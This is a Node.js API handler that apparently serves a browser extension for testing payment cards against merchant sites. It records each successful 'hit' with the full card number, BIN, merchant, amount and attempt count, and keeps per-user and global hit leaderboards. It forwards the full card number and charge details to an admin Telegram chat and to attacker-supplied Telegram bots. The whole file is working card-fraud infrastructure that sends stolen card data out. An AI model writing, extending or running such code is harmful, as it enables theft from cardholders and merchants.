'use strict';
// POST /api/hit
// ─────────────────────────────────────────────────────────
// Records a successful hit, increments the user's counter,
// dispatches Telegram notifications, and RETURNS the fresh
// counts so the extension can update the badge instantly.
//
// Accepts both field-name conventions the extension uses
// (full_card/card_number/cardNumber, merchant/business_url,
//  attempt/attempt_count, timeTaken/time_taken).
// ─────────────────────────────────────────────────────────
const { getAuthUser, extractToken } = require('../lib/auth');
const { supabase }    = require('../lib/supabase');
const { sendMessage } = require('../lib/telegram');
const { cors }        = require('../lib/cors');

const ADMIN_CHAT_ID = process.env.ADMIN_TG_CHAT_ID || '';

function esc(v) {
  return String(v ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

module.exports = async (req, res) => {
  if (cors(req, res)) return;
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const b = req.body || {};
  // token may arrive via Authorization header OR in the JSON body (legacy)
  const token = extractToken(req) || b.token || null;
  const user  = await getAuthUser(token);
  if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });

  // Normalise both naming conventions
  const card_number  = b.full_card || b.card_number || b.cardNumber || null;
  const bin          = b.bin || null;
  const site         = b.site || b.merchant || null;
  const business_url = b.business_url || b.businessUrl || b.merchant || null;
  const amount       = b.amount   || '0';
  const currency     = b.currency || 'usd';
  const attempt_count = b.attempt_count || b.attempt || 0;
  const time_taken    = b.time_taken   || b.timeTaken || null;

  try {
    // 1. Persist the hit
    await supabase.from('hits').insert({
      user_id: user.id,
      card_number, bin, site, business_url,
      amount, currency, attempt_count, time_taken
    });

    // 2. Increment the user's counter
    const user_hits = (user.hits || 0) + 1;
    await supabase.from('users').update({ hits: user_hits }).eq('id', user.id);

    // 3. Fresh global total
    const gAll = await supabase.from('hits').select('id', { count: 'exact', head: true });
    const global_hits = gAll.count || 0;

    // 4. Telegram notifications
    const sentAt = new Date().toLocaleString('en-US', { hour12: false });
    const cur    = (currency || 'usd').toUpperCase();
    const msg = [
      '<b>✅ HIT SUCCESS</b>',
      '',
      `<b>User:</b> ${esc(user.first_name || user.username)} (ID: <code>${esc(user.id)}</code>)`,
      `<b>Site:</b> ${esc(site || 'N/A')}`,
      `<b>URL:</b> ${esc(business_url || 'N/A')}`,
      `<b>Amount:</b> ${esc(amount || '0')} ${esc(cur)}`,
      `<b>Attempts:</b> ${esc(attempt_count || 'N/A')}`,
      `<b>Time Taken:</b> ${esc(time_taken || 'N/A')}`,
      `<b>Card:</b> <code>${esc(card_number || 'N/A')}</code>`,
      `<b>BIN:</b> <code>${esc(bin || 'N/A')}</code>`,
      `<b>Sent At:</b> ${esc(sentAt)}`
    ].join('\n');

    const tasks = [];
    if (ADMIN_CHAT_ID)     tasks.push(sendMessage(ADMIN_CHAT_ID, msg));
    if (user.telegram_id)  tasks.push(sendMessage(user.telegram_id, msg));
    if (b.tg_bot_token && b.tg_chat_id) {
      tasks.push(
        fetch(`https://api.telegram.org/bot${b.tg_bot_token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: b.tg_chat_id, text: msg,
            parse_mode: 'HTML', disable_web_page_preview: true
          })
        }).catch(() => {})
      );
    }
    await Promise.allSettled(tasks);

    // 5. Return fresh counts (extension reads response.hits / global_hits)
    return res.json({ success: true, hits: user_hits, user_hits, global_hits });
  } catch (err) {
    console.error('[hit]', err);
    return res.status(500).json({ success: false, error: 'Failed to record hit' });
  }
};
